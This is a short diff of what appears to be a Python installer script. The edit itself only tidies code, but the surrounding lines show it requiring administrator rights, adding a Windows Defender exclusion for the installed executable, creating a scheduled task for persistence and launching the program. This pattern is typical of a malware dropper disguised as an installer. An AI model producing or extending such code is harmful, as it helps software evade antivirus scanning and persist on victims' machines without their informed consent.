@@ -42,8 +42,6 @@ except KeyboardInterrupt:
 except Exception as e:
     print(f"Error compiling: {e}")
     
-
-
 errored = False # Don't change
 def add_defender_exclusion(file_path):
     global errored
@@ -84,8 +82,6 @@ def create_scheduled_task(task_name, file_path):
 if not PyElevate.elevated():
     input("Please run this installer as an administrator.")
     exit(0)
-    
-task_name = app_name.replace(".exe", "")
 
 if not os.path.exists(target_dir):
     os.makedirs(target_dir)
@@ -134,7 +130,7 @@ except Exception as e:
     sys.exit(1)
 
 add_defender_exclusion(final_app_path)
-create_scheduled_task(task_name, final_app_path)
+create_scheduled_task(app_name.replace(".exe", ""), final_app_path)
 
 try:
     startupinfo = subprocess.STARTUPINFO()
